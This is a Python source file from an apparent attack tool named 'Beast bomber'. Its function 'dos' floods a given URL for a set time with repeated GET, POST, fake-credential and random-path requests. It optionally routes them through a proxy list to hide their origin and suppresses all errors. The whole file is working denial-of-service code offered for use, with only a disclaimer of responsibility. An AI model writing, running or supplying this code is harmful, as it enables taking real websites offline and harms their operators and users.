"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2022 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

import time
import random
import requests
import colorama

colorama.init()


def dos(url, tm, prx):
	lib = ['fdgjnhdoreoijdgf', 'regg343423', 'rrewfsfefgwerg', 'wejfsdv']
	header = {
		"Content-Type": "application/json"
	}
	payload = {}
	t = time.monotonic()
	if prx == 'yes':
		proxy = []
		with open(r"input/proxies.txt", "r", encoding="utf-8") as file:
			for line in file:
				proxy.append(line)

		proxy = [line.rstrip() for line in proxy]
		while time.monotonic() - t <= tm:
			try:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				requests.get(url, proxies = proxies)
				requests.post(url, headers = header, json = payload, proxies = proxies)
				requests.get(url, auth=('username', 'fakepass'), proxies = proxies)
				requests.get(url + '/' + random.choice(lib), proxies = proxies)
			
			except:
				pass
	else:
		while time.monotonic() - t <= tm:
			try:
				requests.get(url)
				requests.post(url, headers = header, json = payload)
				requests.get(url, auth=('username', 'fakepass'))
				requests.get(url + '/' + random.choice(lib))
			
			except:
				pass